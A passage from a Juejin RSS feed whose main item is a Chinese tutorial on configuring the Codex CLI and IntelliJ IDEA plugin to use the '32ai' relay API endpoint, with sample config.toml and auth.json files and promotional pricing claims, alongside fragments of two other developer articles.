<p><strong>仓库地址：</strong> [<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fsharetoyouclub%2Felectron-demo" target="_blank" title="https://gitee.com/sharetoyouclub/electron-demo" ref="nofollow noopener noreferrer">gitee.com/sharetoyouc…</a>]</p>
<p>克隆后，进入任意目录执行 <code>npm install</code>，再按该目录 readme 的脚本运行即可。MIT 许可，欢迎 Star、Fork，或提 Issue / PR。</p>
<hr/>
<p><em>本文基于 Electron 官方文档与示例整理，旨在帮助初学者和开发者快速建立知识地图并找到可运行示例。</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[IDEA + Codex · 32ai 零魔法直连各模型]]></title>    <link>https://juejin.cn/post/7605941424536109110</link>    <guid>https://juejin.cn/post/7605941424536109110</guid>    <pubDate>2026-02-13T04:09:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605941424536109110" data-draft-id="7605807405307723839" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="IDEA + Codex · 32ai 零魔法直连各模型"/> <meta itemprop="keywords" content="OpenAI,AI编程"/> <meta itemprop="datePublished" content="2026-02-13T04:09:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="玹外之音"/> <meta itemprop="url" content="https://juejin.cn/user/2666763911448411"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            IDEA + Codex · 32ai 零魔法直连各模型
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2666763911448411/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    玹外之音
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T04:09:44.000Z" title="Fri Feb 13 2026 04:09:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🧠 IDEA + Codex · 32ai 零魔法直连各模型</h2>
<blockquote>
<p>完整教程——从安装Codex到使用自定义端点，每一步都包含配置截图占位与详细解释。基于<strong>32ai中转平台</strong>，直连、稳定、低价。</p>
</blockquote>
<h3 data-id="heading-1">目录</h3>
<ul>
<li><a href="#%E5%AE%89%E8%A3%85-codex" title="#%E5%AE%89%E8%A3%85-codex">安装 Codex</a></li>
<li><a href="#idea-%E6%8F%92%E4%BB%B6%E6%90%9C%E7%B4%A2--%E5%AE%89%E8%A3%85" title="#idea-%E6%8F%92%E4%BB%B6%E6%90%9C%E7%B4%A2--%E5%AE%89%E8%A3%85">IDEA 插件搜索 &amp; 安装</a></li>
<li><a href="#%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-configtoml" title="#%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-configtoml">修改配置文件 config.toml</a></li>
<li><a href="#%E8%8E%B7%E5%8F%96-32ai-api-key" title="#%E8%8E%B7%E5%8F%96-32ai-api-key">获取 32ai API Key</a></li>
<li><a href="#%E4%BF%AE%E6%94%B9%E8%AE%A4%E8%AF%81%E6%96%87%E4%BB%B6-authjson" title="#%E4%BF%AE%E6%94%B9%E8%AE%A4%E8%AF%81%E6%96%87%E4%BB%B6-authjson">修改认证文件 auth.json</a></li>
<li><a href="#idea-%E4%B8%AD%E5%90%AF%E5%8A%A8-codex" title="#idea-%E4%B8%AD%E5%90%AF%E5%8A%A8-codex">IDEA 中启动 Codex</a></li>
<li><a href="#%E9%AA%8C%E8%AF%81%E6%A8%A1%E5%9E%8B--%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%94%9F%E6%95%88" title="#%E9%AA%8C%E8%AF%81%E6%A8%A1%E5%9E%8B--%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%94%9F%E6%95%88">验证模型 &amp; 配置文件生效</a></li>
<li><a href="#%E4%BB%BB%E5%8A%A1%E6%B5%8B%E8%AF%95--%E5%AE%8C%E6%88%90%E9%9B%86%E6%88%90" title="#%E4%BB%BB%E5%8A%A1%E6%B5%8B%E8%AF%95--%E5%AE%8C%E6%88%90%E9%9B%86%E6%88%90">任务测试 · 完成集成</a></li>
</ul>
<h3 data-id="heading-2">安装 Codex</h3>
<p>全局安装 <code>@openai/codex</code> 包：</p>
<pre><code class="hljs language-bash" lang="bash">npm install -g @openai/codex
</code></pre>
<h3 data-id="heading-3">IDEA 插件搜索 &amp; 安装</h3>
<p>在 IntelliJ IDEA 中搜索插件 <strong>Codex</strong> 并下载安装。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3a12bb7031d4773801bd12ac878a4fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54655aSW5LmL6Z-z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560584&amp;x-signature=khQIhaspesIEVofa9WLTLQDEQb0%3D" alt="屏幕截图 2026-02-13 094222.png" loading="lazy"/></p>
<h3 data-id="heading-4">修改配置文件 config.toml</h3>
<p>Codex 配置优先级（从高到低）：
<code>CLI标志</code> → <code>剖面值 --profile</code> → 项目级 <code>.codex/config.toml</code> → 用户级 → 系统级 → 内置默认。</p>
<p><strong>Windows 用户配置路径</strong>（不存在则创建）：</p>
<pre><code class="hljs language-bash" lang="bash">~/.codex/config.toml   <span class="hljs-comment"># 用户配置</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d426d730f97745d2899dfcf296027e17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54655aSW5LmL6Z-z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560584&amp;x-signature=bjW%2BQ3ebYXYL1KEvDHn3YuNeOGY%3D" alt="屏幕截图 2026-02-13 113420.png" loading="lazy"/></p>
<h4 data-id="heading-5">📋 直接复制以下内容到 config.toml</h4>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-attr">model_provider</span> = <span class="hljs-string">"32ai"</span>
<span class="hljs-attr">model</span> = <span class="hljs-string">"gpt-5-codex"</span>

<span class="hljs-comment"># Reasoning effort: minimal | low | medium | high | xhigh (default: medium; xhigh on gpt-5.2-codex and gpt-5.2)</span>
<span class="hljs-attr">model_reasoning_effort</span> = <span class="hljs-string">"medium"</span>

<span class="hljs-comment"># Reasoning summary: auto | concise | detailed | none (default: auto)</span>
<span class="hljs-attr">model_reasoning_summary</span> = <span class="hljs-string">"auto"</span>

<span class="hljs-comment"># Text verbosity for GPT-5 family (Responses API): low | medium | high (default: medium)</span>
<span class="hljs-attr">model_verbosity</span> = <span class="hljs-string">"medium"</span>

<span class="hljs-comment"># Force-enable reasoning summaries for current model (default: false)</span>
<span class="hljs-attr">model_supports_reasoning_summaries</span> = <span class="hljs-literal">false</span>
<span class="hljs-attr">disable_response_storage</span> = <span class="hljs-literal">true</span>
<span class="hljs-attr">preferred_auth_method</span> = <span class="hljs-string">"apikey"</span>

<span class="hljs-comment"># Optional manual model metadata...</span>
<span class="hljs-comment"># model_context_window = 128000</span>
<span class="hljs-comment"># model_auto_compact_token_limit = 0</span>
<span class="hljs-comment"># tool_output_token_limit = 10000</span>
<span class="hljs-comment"># log_dir = "/absolute/path/to/codex-logs"</span>

<span class="hljs-attr">approval_policy</span> = <span class="hljs-string">"on-request"</span>

<span class="hljs-section">[model_providers]</span>

<span class="hljs-comment"># --- 32ai 自定义提供商 ---</span>
<span class="hljs-section">[model_providers.32ai]</span>
<span class="hljs-attr">name</span> = <span class="hljs-string">"32ai"</span>
<span class="hljs-attr">base_url</span> = <span class="hljs-string">"https://ai.32zi.com/v1"</span>        <span class="hljs-comment"># 核心端点</span>
<span class="hljs-attr">wire_api</span> = <span class="hljs-string">"responses"</span>                           <span class="hljs-comment"># "responses" | "chat"</span>
<span class="hljs-attr">requires_openai_auth</span> = <span class="hljs-literal">true</span>                    
<span class="hljs-attr">request_max_retries</span> = <span class="hljs-number">4</span>                        
<span class="hljs-attr">stream_max_retries</span> = <span class="hljs-number">5</span>                         
<span class="hljs-attr">stream_idle_timeout_ms</span> = <span class="hljs-number">300000</span>                
<span class="hljs-comment"># experimental_bearer_token = ""       </span>
<span class="hljs-comment"># http_headers = { "X-Example" = "value" }</span>

<span class="hljs-section">[profiles]</span>

<span class="hljs-section">[profiles.32ai]</span>
<span class="hljs-attr">model</span> = <span class="hljs-string">"gpt-5-codex"</span>
<span class="hljs-attr">model_provider</span> = <span class="hljs-string">"32ai"</span>
<span class="hljs-attr">approval_policy</span> = <span class="hljs-string">"on-request"</span>
<span class="hljs-attr">sandbox_mode</span> = <span class="hljs-string">"read-only"</span>
<span class="hljs-comment"># oss_provider = "ollama"</span>
<span class="hljs-attr">model_reasoning_effort</span> = <span class="hljs-string">"medium"</span>
<span class="hljs-attr">model_reasoning_summary</span> = <span class="hljs-string">"auto"</span>
<span class="hljs-attr">model_verbosity</span> = <span class="hljs-string">"medium"</span>
<span class="hljs-attr">personality</span> = <span class="hljs-string">"friendly"</span> <span class="hljs-comment"># or "pragmatic" or "none"</span>
<span class="hljs-comment"># chatgpt_base_url = "https://ai.32zi.com/v1"</span>
<span class="hljs-attr">include_apply_patch_tool</span> = <span class="hljs-literal">false</span>
<span class="hljs-attr">experimental_use_unified_exec_tool</span> = <span class="hljs-literal">false</span>
<span class="hljs-attr">experimental_use_freeform_apply_patch</span> = <span class="hljs-literal">false</span>
<span class="hljs-attr">tools.web_search</span> = <span class="hljs-literal">false</span>             

<span class="hljs-section">[notice.model_migrations]</span>
<span class="hljs-attr">gpt-5-codex</span> = <span class="hljs-string">"gpt-5.3-codex"</span>
<span class="hljs-attr">"gpt-5.2-codex"</span> = <span class="hljs-string">"gpt-5.3-codex"</span>
<span class="hljs-comment"># features = { unified_exec = false }</span>
</code></pre>
<p>🔗 参考示例来自 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.openai.com%2Fcodex%2Fconfig-sample" target="_blank" title="https://developers.openai.com/codex/config-sample" ref="nofollow noopener noreferrer">developers.openai.com/codex/confi…</a> (已适配32ai)</p>
<h3 data-id="heading-6">获取 32ai API Key</h3>
<p>前往中转平台 <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fai.32zi.com" target="_blank" title="https://ai.32zi.com" ref="nofollow noopener noreferrer">ai.32zi.com</a></strong> 注册/登录，生成 API 密钥。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/875059ec08c74ffab17ae804945fc458~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54655aSW5LmL6Z-z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560584&amp;x-signature=JFrQD%2BpEaT7AJWzn5Y4U5NtfzL8%3D" alt="屏幕截图 2026-02-12 171825.png" loading="lazy"/></p>
<h4 data-id="heading-7">⚡ 32ai 优势</h4>
<p><strong>低价 · 稳定 · 直连 · 免魔法</strong></p>
<p><strong>价格 0.56 : 1</strong></p>
<h3 data-id="heading-8">修改认证文件 auth.json</h3>
<p>在 Codex 配置目录（通常是用户级 <code>~/.codex/</code>）创建或编辑 <strong>auth.json</strong>，填入你的 API key。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"auth_mode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"apikey"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"OPENAI_API_KEY"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"你的32ai_api_key_粘贴在此"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f011b735ee1f4b44988c9be92c567a59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54655aSW5LmL6Z-z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560584&amp;x-signature=H5mqJ8YH3u4lgHhVMjoJpV5mC4I%3D" alt="屏幕截图 2026-02-13 113420.png" loading="lazy"/></p>
<blockquote>
<p>⚠️ <strong>OPENAI_API_KEY</strong> 就是中转平台 <a href="https://link.juejin.cn?target=https%3A%2F%2Fai.32zi.com" target="_blank" title="https://ai.32zi.com" ref="nofollow noopener noreferrer">ai.32zi.com</a> 获取的密钥。</p>
</blockquote>
<h3 data-id="heading-9">IDEA 中启动 Codex</h3>
<p>返回 IDEA，找到 Codex 插件图标（通常位于右侧边栏或工具窗口），点击启动。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9212df1ecb724b32a417dc863405ce7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54655aSW5LmL6Z-z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560584&amp;x-signature=Rs63Qowl6nTa4uOQ%2FsT8Tr49aJE%3D" alt="屏幕截图 2026-02-13 114038.png" loading="lazy"/></p>
<h3 data-id="heading-10">验证模型 &amp; 配置文件生效</h3>
<p>启动后直接查看当前使用的模型，应当显示 <code>gpt-5-codex</code>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb3189867a314b0b9c864a8384957e70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54655aSW5LmL6Z-z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560584&amp;x-signature=ASIzPjwxoq6Jnz5H0SfyUsSa3tY%3D" alt="屏幕截图 2026-02-13 113110.png" loading="lazy"/></p>
<h3 data-id="heading-11">任务测试 · 完成集成</h3>
<p>给它一个代码任务或任意指令，验证整个链路是否正常工作。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7d9427661eb4ceaac24848951c04677~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54655aSW5LmL6Z-z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560584&amp;x-signature=dmUyZsZHbGCtkd07xuKYuw4rFss%3D" alt="屏幕截图 2026-02-13 113055.png" loading="lazy"/></p>
<blockquote>
<p>🎉 <strong>恭喜！IDEA + Codex (32ai) 已成功集成。</strong> 现在你可以使用自定义端点，基于 GPT-5-Codex 模型进行开发、问答等。</p>
</blockquote>
<hr/>
<h3 data-id="heading-12">💰 为什么选择 32ai？</h3>
<p><strong>低至 0.56 : 1 比率</strong></p>

















<table><thead><tr><th>功能</th><th>优势</th></tr></thead><tbody><tr><td>价格方案</td><td><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf2e0b80784d4ae590d8e93bd4ed2319~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54655aSW5LmL6Z-z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560584&amp;x-signature=umDnomRYz6UjZcX5UzI6bJEK3Kg%3D" alt="屏幕截图 2026-02-12 172853.png" loading="lazy"/></td></tr><tr><td>计费说明</td><td><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4357e4e48ef543c5a67011de31b81c96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54655aSW5LmL6Z-z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560584&amp;x-signature=4OatHyWOTFmH69E7U1GyWwlezLA%3D" alt="屏幕截图 2026-02-12 173008.png" loading="lazy"/></td></tr></tbody></table>
<p>🔗 <strong>快速访问</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fai.32zi.com" target="_blank" title="https://ai.32zi.com" ref="nofollow noopener noreferrer">ai.32zi.com</a> — 直连、无需魔法。</p>
<h3 data-id="heading-13">📌 配置备忘</h3>
<ul>
<li>使用用户配置 (<code>~/.codex/config.toml</code>) 全局生效</li>
<li>配置节 <code>[model_providers.32ai]</code> 定义 base_url = <a href="https://link.juejin.cn?target=https%3A%2F%2Fai.32zi.com%2Fv1" target="_blank" title="https://ai.32zi.com/v1" ref="nofollow noopener noreferrer">ai.32zi.com/v1</a> 以及 wire_api = responses</li>
<li>通过 <code>[profiles.32ai]</code> 关联提供商与模型，personality 可选 friendly / pragmatic</li>
<li>迁移通知：<code>gpt-5-codex → gpt-5.3-codex</code> 自动映射</li>
<li>更多高级参数（日志、上下文窗口）可按需取消注释</li>
</ul>
<h4 data-id="heading-14">🔄 官方模型迁移 (notice.model_migrations)</h4>
<p><code>gpt-5-codex</code> → <code>gpt-5.3-codex</code>     <code>gpt-5.2-codex</code> → <code>gpt-5.3-codex</code></p>
<hr/>
<p>⚡ <strong>IDEA + Codex + 32ai</strong> 全流程集成完毕。</p>
<p>享受低价、稳定、无需代理的GPT-5-Codex编程体验。</p>
<hr/>
<p><strong>原创声明</strong>：本文为原创教程，转载请注明出处</p>
<p>欢迎在评论区交流讨论！如果觉得有帮助，请点赞收藏支持～</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【保姆级教程】Claude Code 进阶指南：用 Everything Claude Code 打造更有“记忆”的 AI 程序员]]></title>    <link>https://juejin.cn/post/7605811866908786697</link>    <guid>https://juejin.cn/post/7605811866908786697</guid>    <pubDate>2026-02-13T04:05:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605811866908786697" data-draft-id="7605817795628974130" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【保姆级教程】Claude Code 进阶指南：用 Everything Claude Code 打造更有“记忆”的 AI 程序员"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2026-02-13T04:05:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="李同学Lino"/> <meta itemprop="url" content="https://juejin.cn/user/3085689267423785"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【保姆级教程】Claude Code 进阶指南：用 Everything Claude Code 打造更有“记忆”的 AI 程序员
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3085689267423785/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    李同学Lino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T04:05:41.000Z" title="Fri Feb 13 2026 04:05:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body 